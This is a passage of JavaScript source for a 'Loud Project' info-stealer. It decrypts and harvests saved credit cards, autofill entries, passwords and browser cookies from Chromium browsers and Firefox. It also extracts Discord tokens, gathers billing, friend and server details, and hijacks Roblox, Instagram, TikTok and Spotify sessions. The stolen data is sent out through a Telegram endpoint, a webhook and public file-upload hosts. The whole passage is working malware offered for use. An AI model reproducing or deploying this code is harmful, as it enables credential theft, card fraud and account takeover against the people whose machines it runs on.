  const path_split_tail = path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2);
  let path_tail = path_split_tail.join("\\") + "\\";

  if (path.startsWith(appdata)) path_tail = path;
  if (path.includes("cord")) return;
  if (!fs.existsSync(path_tail)) return;

  const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").subarray(5);
  const login_data = path + "Web Data";
  const creditcards_db = path + "creditcards.db";

  fs.copyFileSync(login_data, creditcards_db);

  if (creditcards_db.includes("Chrome") && !cardsBrowserUsed.has("Chrome")) {
    cardsBrowserUsed.add("Chrome");
  } else if (creditcards_db.includes("Firefox") && !cardsBrowserUsed.has("Firefox")) {
    cardsBrowserUsed.add("Firefox");
  } else if (creditcards_db.includes("Edge") && !cardsBrowserUsed.has("Edge")) {
    cardsBrowserUsed.add("Edge");
  } else if (creditcards_db.includes("Opera") && !cardsBrowserUsed.has("Opera")) {
    cardsBrowserUsed.add("Opera");
  } else if (creditcards_db.includes("Firefox") && !cardsBrowserUsed.has("Firefox")) {
    cardsBrowserUsed.add("Firefox");
  } else if (creditcards_db.includes("Yandex") && !cardsBrowserUsed.has("Yandex")) {
    cardsBrowserUsed.add("Yandex");
  } else if (creditcards_db.includes("Brave") && !cardsBrowserUsed.has("Brave")) {
    cardsBrowserUsed.add("Brave");
  }

  const key = Dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
  let result = `\n\nCREDIT CARDS FROM: ${path} #LoudProject`;

  const sql = new sqlite3.Database(creditcards_db, (err) => {
    if (err) {
    }
  });

  const cb = await new Promise((resolve) => {
    sql.each(
      "SELECT * FROM credit_cards",
      function (err, row) {
        if (err || !row["card_number_encrypted"]) return;

        const card_number = row["card_number_encrypted"];

        try {
          if (card_number[0] == 1 && card_number[1] == 0 && card_number[2] == 0 && card_number[3] == 0) {
            result +=
              "\nCREDIT CARD NUMBER: " +
              Dpapi.unprotectData(card_number, null, "CurrentUser").toString("utf-8") +
              " | EXPIRE: " +
              row["expiration_month"] +
              "/" +
              row["expiration_year"] +
              " | NAME: " +
              row["name_on_card"];
            ccCount++;
          } else {
            const start = card_number.slice(3, 15);
            const middle = card_number.slice(15, card_number.length - 16);
            const end = card_number.slice(card_number.length - 16, card_number.length);
            const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

            decipher.setAuthTag(end);

            result +=
              "\nCREDIT CARD NUMBER: " +
              decipher.update(middle, "base64", "utf-8") +
              decipher.final("utf-8") +
              " | EXPIRE: " +
              row["expiration_month"] +
              "/" +
              row["expiration_year"] +
              " | NAME: " +
              row["name_on_card"];
            ccCount++;
          }
        } catch {}
      },
      function () {
        resolve(result);
      }
    );
  });

  return cb;
}

async function getAutofilldata(path) {
  const path_split = path.split("\\");
  const path_split_tail = path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2);
  let path_tail = path_split_tail.join("\\") + "\\";

  if (path.startsWith(appdata)) path_tail = path;
  if (path.includes("cord")) return;
  if (!fs.existsSync(path_tail)) return;

  const login_data = path + "Web Data";
  const autofilldata_db = path + "autofilldata.db";

  fs.copyFileSync(login_data, autofilldata_db);

  if (autofilldata_db.includes("Chrome") && !autofilldataBrowserUsed.has("Chrome")) {
    autofilldataBrowserUsed.add("Chrome");
  } else if (autofilldata_db.includes("Firefox") && !autofilldataBrowserUsed.has("Firefox")) {
    autofilldataBrowserUsed.add("Firefox");
  } else if (autofilldata_db.includes("Edge") && !autofilldataBrowserUsed.has("Edge")) {
    autofilldataBrowserUsed.add("Edge");
  } else if (autofilldata_db.includes("Opera") && !autofilldataBrowserUsed.has("Opera")) {
    autofilldataBrowserUsed.add("Opera");
  } else if (autofilldata_db.includes("Firefox") && !autofilldataBrowserUsed.has("Firefox")) {
    autofilldataBrowserUsed.add("Firefox");
  } else if (autofilldata_db.includes("Yandex") && !autofilldataBrowserUsed.has("Yandex")) {
    autofilldataBrowserUsed.add("Yandex");
  } else if (autofilldata_db.includes("Brave") && !autofilldataBrowserUsed.has("Brave")) {
    autofilldataBrowserUsed.add("Brave");
  }

  let result = `\n\nAUTO FILL DATA FROM: ${path} #LoudProject`;

  const sql = new sqlite3.Database(autofilldata_db, (err) => {
    if (err) {
    }
  });

  const autofill = await new Promise((resolve) => {
    sql.each(
      "SELECT * FROM autofill",
      function (err, row) {
        if (err) return;

        result += "\nNAME: " + row["name"] + " | DATA: " + row["value"];
        autofillCount++;
      },
      function () {
        resolve(result);
      }
    );
  });

  return autofill;
}

async function getPizzas(path) {
  const path_split = path.split("\\");
  const path_split_tail = path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2);
  let path_tail = path_split_tail.join("\\") + "\\";

  if (path.startsWith(appdata)) path_tail = path;
  if (path.includes("cord")) return;
  if (!fs.existsSync(path_tail)) return;

  const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").subarray(5);
  const login_data = path + "Login Data";
  const passwords_db = path + "passwords.db";

  fs.copyFileSync(login_data, passwords_db);

  if (passwords_db.includes("Chrome") && !passwordsBrowserUsed.has("Chrome")) {
    passwordsBrowserUsed.add("Chrome");
  } else if (passwords_db.includes("Firefox") && !passwordsBrowserUsed.has("Firefox")) {
    passwordsBrowserUsed.add("Firefox");
  } else if (passwords_db.includes("Edge") && !passwordsBrowserUsed.has("Edge")) {
    passwordsBrowserUsed.add("Edge");
  } else if (passwords_db.includes("Opera") && !passwordsBrowserUsed.has("Opera")) {
    passwordsBrowserUsed.add("Opera");
  } else if (passwords_db.includes("Firefox") && !passwordsBrowserUsed.has("Firefox")) {
    passwordsBrowserUsed.add("Firefox");
  } else if (passwords_db.includes("Yandex") && !passwordsBrowserUsed.has("Yandex")) {
    passwordsBrowserUsed.add("Yandex");
  } else if (passwords_db.includes("Brave") && !passwordsBrowserUsed.has("Brave")) {
    passwordsBrowserUsed.add("Brave");
  }

  const key = Dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
  let result = `\n\nPASSWORDS FROM: ${path} #LoudProject`;

  const sql = new sqlite3.Database(passwords_db, (err) => {
    if (err) {
    }
  });

  const pizza = await new Promise((resolve) => {
    sql.each(
      "SELECT origin_url, username_value, password_value FROM logins",
      function (err, row) {
        if (err || !row["username_value"]) return;

        const password_value = row["password_value"];

        try {
          if (password_value[0] == 1 && password_value[1] == 0 && password_value[2] == 0 && password_value[3] == 0) {
            const decrypted = Dpapi.unprotectData(password_value, null, "CurrentUser").toString("utf-8");
            allPasswords.push(decrypted);

            passwordCount++;
            result += "\nURL: " + row["origin_url"] + " | USERNAME: " + row["username_value"] + " | PASSWORD: " + decrypted;
          } else {
            const start = password_value.slice(3, 15);
            const middle = password_value.slice(15, password_value.length - 16);
            const end = password_value.slice(password_value.length - 16, password_value.length);
            const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

            decipher.setAuthTag(end);

            const decrypted = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
            allPasswords.push(decrypted);

            result += "\nURL: " + row["origin_url"] + " | USERNAME: " + row["username_value"] + " | PASSWORD: " + decrypted;
            passwordCount++;
          }
        } catch {}
      },
      function () {
        resolve(result);
      }
    );
  });

  return pizza;
}

async function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

async function getWebSocketDebuggerUrl() {
  for (let i = 0; i < 10; i++) {
    try {
      const response = await axios.get("http://localhost:9222/json");
      return response.data[0].webSocketDebuggerUrl;
    } catch (err) {
      await delay(500); // Retry every 500ms
    }
  }
  throw new Error("Debugger port not responding");
}

async function getAllCookies(wsUrl) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(wsUrl);
    ws.on("open", () => {
      ws.send(JSON.stringify({ id: 1, method: "Network.getAllCookies" }));
    });
    ws.on("message", (data) => {
      const response = JSON.parse(data.toString());
      if (response.id === 1) {
        ws.close();
        resolve(response.result.cookies);
      }
    });
    ws.on("error", () => resolve([]));
  });
}

async function getCheese(fakePath) {
  const browserGuess = (() => {
    if (fakePath.includes("Chrome")) return "chrome";
    if (fakePath.includes("Edge")) return "edge";
    if (fakePath.includes("Brave")) return "brave";
    return null;
  })();

  if (!browserGuess) return;
  cookiesBrowserUsed.add(browserGuess)
  const BROWSERS = {
    chrome: {
      bin: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    },
    edge: {
      bin: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    },
    brave: {
      bin: "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
    },
  };

  const browser = BROWSERS[browserGuess];
  if (!fs.existsSync(browser.bin)) return;

  const tempProfile = path.join(process.env.TEMP, `temp-profile-${browserGuess}-${randomChar(8)}`);
  if (!fs.existsSync(tempProfile)) fs.mkdirSync(tempProfile);

  const proc = spawn(browser.bin, [
    "--remote-debugging-port=9222",
    `--user-data-dir=${tempProfile}`,
    "--no-first-run",
    "--headless=new",
    "--disable-extensions",
    "--disable-gpu",
  ], {
    detached: true,
    stdio: "ignore",
  });

  try {
    await delay(7000);
    const wsUrl = await getWebSocketDebuggerUrl();
    const cookies = await getAllCookies(wsUrl);

    if (!cookies.length) return;

    let result = "";
    for (const cookie of cookies) {
      result += `${cookie.domain}\tTRUE\t/\tFALSE\t2597573456\t${cookie.name}\t${cookie.value}\n`;

      if (cookie.name === ".ROBLOSECURITY") sendRoblox(cookie.value);
      if (cookie.domain.includes("instagram") && cookie.name.includes("sessionid")) getInsta(cookie.value);
      if (cookie.domain.includes(".tiktok.com") && cookie.name.includes("sessionid")) getTiktok(cookie.value);
      if (cookie.domain.includes(".spotify.com") && cookie.name.includes("sp_dc")) getSpotify(cookie.value);

      cookieCount++;
    }

    return result;
  } catch (e) {
    console.log(`[${browserGuess}] Failed to get cookies via WebSocket: ${e.message}`);
    return;
  } finally {
    try {
      process.kill(-proc.pid);
    } catch {}
    await closeBrowsers()
    try{
    fs.rmSync(tempProfile, { recursive: true, force: true });
    }catch{}
  }
}

function getGeckoProfiles(path) {
  const profiles = [];

  if (fs.existsSync(path)) {
    for (const dir of fs.readdirSync(path)) {
      if (dir.includes(".default-release") || dir.includes(".default-default-")) profiles.push(`${path}${dir}\\`);
    }
    return profiles;
  } else {
    return [];
  }
}

const geckoPaths = [...getGeckoProfiles(appdata + "\\Mozilla\\Firefox\\Profiles\\", "Firefox"), ...getGeckoProfiles(appdata + "\\Waterfox\\Profiles\\", "Waterfox")];
async function getFirefoxCookies() {
  let cookies = "";

  for (const path of geckoPaths) {
    if (!fs.existsSync(`${path}cookies.sqlite`)) continue;

    try {
      const result = await getGeckoCookies(path);
      cookies += result;
    } catch {
      continue;
    }
  }

  return cookies;
}

async function getFirefoxPasswords() {
  let passwords = "";

  for (const path of geckoPaths) {
    if (!fs.existsSync(`${path}logins.json`)) continue;

    try {
      const result = await getGeckoPasswords(path, "");
      passwords += result;
    } catch {
      continue;
    }
  }

  return passwords;
}

async function getGeckoCookies(path) {
  var result = "";
  const sql = new sqlite3.Database(`${path}cookies.sqlite`, (err) => {
    if (err) {
    }
  });
  const cheese = await new Promise((resolve, reject) => {
    sql.each(
      "SELECT * FROM moz_cookies",
      function (err, row) {
        if (err) return;
        cookieCount++;

        if (row["name"] === ".ROBLOSECURITY") sendRoblox(`${row["value"]}`);
        if (row["host"].includes("instagram") && row["name"].includes("sessionid")) getInsta(`${row["value"]}`);
        if (row["host"].includes(".tiktok.com") && row["name"].includes("sessionid")) getTiktok(`${row["value"]}`);
        if (row["host"].includes(".spotify.com") && row["name"].includes("sp_dc")) getSpotify(`${row["value"]}`);

        result += `${row["host"]}\tTRUE\t/\tFALSE\t2597573456\t${row["name"]}\t${row["value"]}\n`;
      },
      function () {
        resolve(result);
      }
    );
  });
  return cheese;
}

async function getGeckoPasswords(profile, masterPassword) {
  var passwords = `PASSWORDS FROM: ${profile} #LoudProject`;

  const key = await getKey(profile, masterPassword);
  if (!key) return passwords;

  const loginsPath = path.join(profile, "logins.json");
  if (!fs.existsSync(loginsPath)) return passwords;

  const loginsData = fs.readFileSync(loginsPath, "utf8");
  const profileLogins = JSON.parse(loginsData);

  for (const login of profileLogins.logins) {
    passwordCount++;

    const decodedUsername = decodeLoginData(login.encryptedUsername);
    const decodedPassword = decodeLoginData(login.encryptedPassword);

    const username = decrypt(decodedUsername.data, decodedUsername.iv, key, "3DES-CBC");
    const password = decrypt(decodedPassword.data, decodedPassword.iv, key, "3DES-CBC");

    passwords += "\nURL: " + login.hostname + " | USERNAME: " + username.data + " | PASSWORD: " + password.data;
  }

  return passwords;
}

function decodeLoginData(b64) {
  const asn1 = forge.asn1.fromDer(forge.util.decode64(b64));
  return {
    iv: asn1.value[1].value[1].value,
    data: asn1.value[2].value,
  };
}

async function getKey(profileDirectory, masterPassword) {
  const key4FilePath = path.join(profileDirectory, "key4.db");
  if (!fs.existsSync(key4FilePath)) return null;

  const masterPasswordBytes = forge.util.encodeUtf8(masterPassword || "");
  const key4Db = new sqlite3.Database(key4FilePath, (err) => {
    if (err) console.log(err);
  });

  const key = new Promise((resolve) => {
    key4Db.each("SELECT item1, item2 FROM metadata WHERE id = 'password';", function (err, metaData) {
      if (err) {
      }

      if (metaData && metaData.item1 && metaData.item2) {
        const globalSalt = toByteString(metaData.item1);
        const item2 = toByteString(metaData.item2);
        const item2Asn1 = forge.asn1.fromDer(item2);
        const item2Value = pbesDecrypt(item2Asn1.value, masterPasswordBytes, globalSalt);

        if (item2Value && item2Value.data === "password-check") {
          key4Db.each("SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;", function (err, nssData) {
            if (err) {
            }

            if (nssData && nssData.a11) {
              const a11 = toByteString(nssData.a11);
              const a11Asn1 = forge.asn1.fromDer(a11);

              resolve(pbesDecrypt(a11Asn1.value, masterPasswordBytes, globalSalt));
            }
          });
        }
      }
    });
  });

  return key;
}

function pbesDecrypt(decodedItemSeq, password, globalSalt) {
  if (decodedItemSeq[0].value[1].value[0].value[1].value != null) {
    return pbes2Decrypt(decodedItemSeq, password, globalSalt);
  }
  return pbes1Decrypt(decodedItemSeq, password, globalSalt);
}

function pbes1Decrypt(decodedItemSeq, password, globalSalt) {
  const data = decodedItemSeq[1].value;
  const salt = decodedItemSeq[0].value[1].value[0].value;
  const hp = sha1(globalSalt + password);
  const pes = toByteString(pad([...salt], 20).buffer);
  const chp = sha1(hp + salt);
  const k1 = hmac(pes + salt, chp);
  const tk = hmac(pes, chp);
  const k2 = hmac(tk + salt, chp);
  const k = k1 + k2;
  const kBuffer = forge.util.createBuffer(k);
  const otherLength = kBuffer.length() - 32;
  const key = kBuffer.getBytes(24);
  kBuffer.getBytes(otherLength);
  const iv = kBuffer.getBytes(8);
  return decrypt(data, iv, key, "3DES-CBC");
}

function pbes2Decrypt(decodedItemSeq, password, globalSalt) {
  const data = decodedItemSeq[1].value;
  const pbkdf2Seq = decodedItemSeq[0].value[1].value[0].value[1].value;
  const salt = pbkdf2Seq[0].value;
  const iterations = pbkdf2Seq[1].value.charCodeAt();
  const iv = "" + decodedItemSeq[0].value[1].value[1].value[1].value;
  const k = sha1(globalSalt + password);
  const key = forge.pkcs5.pbkdf2(k, salt, iterations, 32, forge.md.sha256.create());
  return decrypt(data, iv, key, "AES-CBC");
}

function decrypt(data, iv, key, algorithm) {
  const decipher = forge.cipher.createDecipher(algorithm, key);
  decipher.start({ iv: iv });
  decipher.update(forge.util.createBuffer(data));
  decipher.finish();
  return decipher.output;
}

function sha1(data) {
  const md = forge.md.sha1.create();
  md.update(data, "raw");
  return md.digest().data;
}

function pad(arr, length) {
  if (arr.length >= length) {
    return arr;
  }
  const padAmount = length - arr.length;
  const padArr = [];
  for (let i = 0; i < padAmount; i++) {
    padArr.push(0);
  }

  var newArr = new Uint8Array(padArr.length + arr.length);
  newArr.set(padArr, 0);
  newArr.set(arr, padArr.length);
  return newArr;
}

function hmac(data, key) {
  const hmac = forge.hmac.create();
  hmac.start("sha1", key);
  hmac.update(data, "raw");
  return hmac.digest().data;
}

function toByteString(buffer) {
  return String.fromCharCode.apply(null, new Uint8Array(buffer));
}

function formatBytes(a, b) {
  let c = 1024;
  let d = b || 2;
  let e = [" B", " KB", " MB", " GB", " TB"];
  let f = Math.floor(Math.log(a) / Math.log(c));

  return parseFloat((a / Math.pow(c, f)).toFixed(d)) + "" + e[f];
}

async function takeCreditcards() {
  let creditcards = "";

  for (let i = 0; i < paths.length; i++) {
    if (fs.existsSync(paths[i] + "Web Data")) creditcards += (await getCreditcards(paths[i])) || "";
  }

  if (!creditcards.includes("NUMBER:")) creditcards = "Creditcards not found.";
  fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\creditcards.txt`, creditcards);
}

async function takeAutofilldata() {
  let autofilldata = "";

  for (let i = 0; i < paths.length; i++) {
    if (fs.existsSync(paths[i] + "Web Data")) autofilldata += (await getAutofilldata(paths[i])) || "";
  }

  if (!autofilldata.includes("NAME:")) autofilldata = "Autofilldata not found.";
  fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\autofilldata.txt`, autofilldata);
}

async function takePizzas() {
  let passwords = "";

  passwords += (await getFirefoxPasswords()) || "";

  for (let i = 0; i < paths.length; i++) {
    if (fs.existsSync(paths[i] + "Login Data")) passwords += (await getPizzas(paths[i])) || "";
  }

  if (!passwords.includes("PASSWORD:")) passwords = "Passwords not found.";
  fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\passwords.txt`, passwords);
}

async function takeCheese() {
  let cookies = "";

  const firefoxCookies = (await getFirefoxCookies()) || "";
  if (firefoxCookies.includes("TRUE")) {
    cookies += firefoxCookies;

    if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\cookies`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\cookies`);
    fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\cookies\\Firefox.txt`, firefoxCookies);
  }

  for (let i = 0; i < paths.length; i++) {
    const path = paths[i].includes("Opera") ? paths[i] + "Network\\" : paths[i];

    if (!fs.existsSync(path + "Cookies")) continue;

    const cheese = (await getCheese(path)) || "";
    if (!cheese || !cheese.includes("TRUE")) continue;

    cookies += cheese;
    const browserName = getBrowserNameByPath(path);

    if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\cookies`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\cookies`);
    fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\cookies\\${browserName}.txt`, cheese);
  }

  if (!cookies.includes("TRUE")) cookies = "Cookies not found.";
  fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\cookies.txt`, cookies);
}

function getBrowserNameByPath(path) {
  const using = path.split("\\").find((p) => p.includes("Default") || p.includes("Profile"));

  if (path.includes("Chrome")) return `Google_Chome${using ? `_${using}` : ""}`;
  else if (path.includes("Opera Stable")) return `Opera_Stable${using ? `_${using}` : ""}`;
  else if (path.includes("Opera GX")) return `Opera_GX${using ? `_${using}` : ""}`;
  else if (path.includes("Brave")) return `Brave${using ? `_${using}` : ""}`;
  else if (path.includes("Yandex")) return `Yandex${using ? `_${using}` : ""}`;
  else if (path.includes("Edge")) return `Edge${using ? `_${using}` : ""}`;
  else return "Unknown";
}

async function findToken(path) {
  const path_tail = path;
  path += "Local Storage\\leveldb";

  if (!path_tail.includes("discord")) {
    try {
      fs.readdirSync(path).map((file) => {
        (file.endsWith(".log") || file.endsWith(".ldb")) &&
          fs
            .readFileSync(path + "\\" + file, "utf8")
            .split(/\r?\n/)
            .forEach((line) => {
              const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];

              for (const pattern of patterns) {
                const foundTokens = line.match(pattern);

                if (foundTokens.length)
                  foundTokens.forEach((token) => {
                    if (!tokens.includes(token)) tokens.push(token);
                  });
              }
            });
      });
    } catch {}
  } else {
    if (!fs.existsSync(path_tail + "\\Local State")) return;

    try {
      fs.readdirSync(path).map((file) => {
        (file.endsWith(".log") || file.endsWith(".ldb")) &&
          fs
            .readFileSync(path + "\\" + file, "utf8")
            .split(/\r?\n/)
            .forEach((line) => {
              const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g);
              const foundTokens = line.match(pattern);

              if (foundTokens) {
                foundTokens.forEach((token) => {
                  const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").subarray(5);
                  const key = Dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");

                  token = Buffer.from(token.split("dQw4w9WgXcQ:")[1], "base64");

                  const start = token.slice(3, 15);
                  const middle = token.slice(15, token.length - 16);
                  const end = token.slice(token.length - 16, token.length);
                  const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

                  decipher.setAuthTag(end);

                  const finalToken = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
                  if (!tokens.includes(finalToken)) tokens.push(finalToken);
                });
              }
            });
      });
    } catch {}
  }
}

async function takeGuilds(token) {
  const guilds = await axios
    .get("https://discord.com/api/v9/users/@me/guilds", {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    })
    .then((response) => response.data)
    .catch(() => null);
  if (!guilds || !Array.isArray(guilds) || !guilds.length) return;

  const guild_str =
    "GUILDS FROM: " + token + "  #LoudProject\n\n" + guilds.map((g) => `GUILD_NAME: ${g.name} - GUILD_ID: ${g.id} - GUILD_OWNER: ${g.owner ? "Yes" : "No"}`).join("\n");
  fs.appendFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\guilds.txt`, guild_str + "\n\n");
}

async function takeBots(token) {
  const bots = await axios
    .get("https://discord.com/api/v9/applications?with_team_applications=true", {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    })
    .then((response) => response.data)
    .catch(() => null);
  if (!bots || !Array.isArray(bots) || !bots.length) return;

  const certif = {
    1: "No",
    2: "Eligible",
    3: "In progress",
    4: "Yes",
  };

  const bots_str =
    "BOTS FROM: " +
    token +
    "  #LoudProject\n\n" +
    bots
      .map(
        (c) =>
          `BOT: ${c.bot.username} (${c.bot.id}) - BOT_OWNER: ${c.owner.username}#${c.owner.discriminator} (${c.owner.id}) - CERTIFIED_BOT: ${
            certif[c.verification_state]
          } - PUBLIC_BOT: ${c.bot_public ? "Yes" : "No"}`
      )
      .join("\n");
  fs.appendFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\bots.txt`, bots_str + "\n\n");
}

async function uploadFile(filePath) {
    const url = "https://bashupload.com/";
  
    const formData = new FormData();
    formData.append("file_1", fs.createReadStream(filePath));

    try {
        const response = await axios.post(url, formData, {
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            headers: {
                ...formData.getHeaders(),
            },
        });

        if (response.status === 200 && response.data) {
            const match = response.data.match(/https:\/\/bashupload\.com\/[^\/]+\/([^\/\s]+\.\w+)/);
            if (match && match[0]) {
                return match[0]+"?download=1";
            } else {
                return null;
            }
        } else {
            return null;
        }
    } catch (error) {
        console.log(error)
        return null;
    }
}

async function upload(filePath) {
  try {
    const url = "https://rdmfile.eu/api/upload";
    const formData = new FormData();
    formData.append("file", fs.createReadStream(filePath));

    const response = await axios.post(url, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });
    return response.data.download_url;
  } catch (error) {
    console.log(error)
    let link = await uploadFile(filePath)
    return link;
  }
}


async function stealTokens() {
  for (let path of paths) {
    await findToken(path);
  }

  for (let token of tokens) {
    const json = await axios
      .get("https://discord.com/api/v9/users/@me", {
        headers: {
          "Content-Type": "application/json",
          authorization: token,
        },
      })
      .then((response) => response.data)
      .catch(() => null);
    if (!json) continue;

    await takeGuilds(token);
    await takeBots(token);

    const ip = await getIp();
    const billing = await getBilling(token);
    const relationships = await getRelationships(token);

    fs.appendFileSync(
      process.env.TEMP + `\\LoudProject\\${rdm}\\tokens.txt`,
      `==================================================\nIdentifier      : ${json.id}\nUsername        : ${json.username}\nPhone           : ${
        json.phone || "None"
      }\nE-Mail Address  : ${json.email || "None"}\nLocale          : ${json.locale}\nNitro           : ${
        json.premium_type === 1 ? "Nitro Classic" : json.premium_type === 2 ? "Nitro Boost" : json.premium_type === 3 ? "Nitro Basic" : "No nitro"
      }\nBadges          : ${getBadgesNames(json.flags)}\nBilling         : ${billing
        .replaceAll("`", "")
        .replaceAll("<:946246524504002610:962747802830655498>", "Paypal ")
        .replaceAll("<:bby:987692721613459517>", "Creditcard ")}\nToken           : ${token}\n==================================================\n\n`
    );

    axios
      .post(`${tlg}`, {
        text: `🚀 Loud Project | Discord Accounts\n\n👤 Username: ${json.username} (${json.id})\n🔑 Token: ${token}\n💎 Badges: ${getBadgesNames(json.flags)}\n🌐 Phone: ${
          json.phone || "None"
        }\n🔌 Nitro: ${
          json.premium_type === 1 ? "Nitro Classic" : json.premium_type === 2 ? "Nitro Boost" : json.premium_type === 3 ? "Nitro Basic" : "No nitro"
        }\n💳 Billing: ${billing
          .replaceAll("`", "")
          .replaceAll("<:946246524504002610:962747802830655498>", "PayPal ")
          .replaceAll("<:bby:987692721613459517>", "Creditcard ")}\n📩 Email: ${json.email}`,
      })
      .catch(() => null);
    axios
      .post(wbk, {
        avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
        username: "Loud Project",
        embeds: [
          {
            fields: [
              {
                name: `<a:bby:987689940852817971> Token:`,
                value: `\`${token}\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
                inline: false,
              },
              {
                name: `<:bby:987689933844127804> Badges:`,
                value: getBadges(json.flags),
                inline: true,
              },
              {
                name: `<:bby:987689935018549328> Nitro Type:`,
                value: await getNitro(json.premium_type, json.id, token),
                inline: true,
              },
              {
                name: `<a:bby:987689939401588827> Billing:`,
                value: billing,
                inline: true,
              },
              {
                name: `<:bby:987689943558135818> Email:`,
                value: `\`${json.email}\``,
                inline: true,
              },
              {
                name: `<:bby:987689942350196756> IP:`,
                value: `\`${ip}\``,
                inline: true,
              },
            ],
            color: 13172927,
            author: {
              name: `${json.username} (${json.id})`,
              icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
            },
            footer: {
              text: "Loud Project | https://t.me/LoudProject",
            },
            thumbnail: {
              url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`,
            },
          },
          {
            color: 13172927,
            description: relationships.friends,
            author: {
              name: `HQ Friends (${relationships.length})`,
              icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
            },
            footer: {
              text: "Loud Project | https://t.me/LoudProject",
            },
          },
        ],
      })
      .catch(() => null);
  }
}

const badges = {
  Discord_Employee: {
    Value: 1,
    Emoji: "<:staff:874750808728666152>",
    Rare: true,
  },
  Partnered_Server_Owner: {
    Value: 2,
    Emoji: "<:partner:874750808678354964>",
    Rare: true,
  },
  HypeSquad_Events: {
    Value: 4,
    Emoji: "<:hypesquad_events:874750808594477056>",
    Rare: true,
  },
  Bug_Hunter_Level_1: {
    Value: 8,
    Emoji: "<:bughunter_1:874750808426692658>",
    Rare: true,
  },
  Early_Supporter: {
    Value: 512,
    Emoji: "<:early_supporter:874750808414113823>",
    Rare: true,
  },
  Bug_Hunter_Level_2: {
    Value: 16384,
    Emoji: "<:bughunter_2:874750808430874664>",
    Rare: true,
  },
  Early_Verified_Bot_Developer: {
    Value: 131072,
    Emoji: "<:developer:874750808472825986>",
    Rare: true,
  },
  House_Bravery: {
    Value: 64,
    Emoji: "<:bravery:874750808388952075>",
    Rare: false,
  },
  House_Brilliance: {
    Value: 128,
    Emoji: "<:brilliance:874750808338608199>",
    Rare: false,
  },
  House_Balance: {
    Value: 256,
    Emoji: "<:balance:874750808267292683>",
    Rare: false,
  },
  Discord_Official_Moderator: {
    Value: 262144,
    Emoji: "<:moderator:976739399998001152>",
    Rare: true,
  },
};

async function getRelationships(token) {
  const json = await axios
    .get("https://discord.com/api/v9/users/@me/relationships", {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    })
    .then((response) => response.data)
    .catch(() => null);

  if (!json || !Array.isArray(json)) return "*Account locked*";
  if (!json.length) return "*No Rare Friends*";

  const friends = json.filter((user) => user.type == 1);
  let final = "";

  for (const friend of friends) {
    const badges = getRareBadges(friend.user.public_flags);
    if (badges) final += `${badges} | \`${friend.user.username}\`\n`;
  }

  return {
    length: friends.length,
    friends: final || "*No Rare Friends*",
  };
}
async function getBilling(token) {
  const json = await axios
    .get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    })
    .then((response) => response.data)
    .catch(() => null);

  if (!json || !Array.isArray(json)) return "`Unknown`";
  if (!json.length) return "`No Billing`";

  let billings = "";

  for (const billing of json) {
    if (billing.type == 2 && billing.invalid != !0) {
      billings += "<:946246524504002610:962747802830655498>";
    } else if (billing.type == 1 && billing.invalid != !0) {
      billings += "<:bby:987692721613459517>";
    }
  }

  return billings || "`No Billing`";
}

function getBadges(flags) {
  let Badges = "";

  for (const prop in badges) {
    const badge = badges[prop];
    if ((flags & badge.Value) == badge.Value) Badges += badge.Emoji;
  }

  return Badges || "`No Badges`";
}

function getBadgesNames(flags) {
  let Badges = [];

  for (const prop in badges) {
    const badge = badges[prop];
    if ((flags & badge.Value) == badge.Value) Badges.push(prop);
  }

  return Badges.length ? Badges.join(", ") : "No Badges";
}

function getRareBadges(flags) {
  let Badges = "";

  for (const prop in badges) {
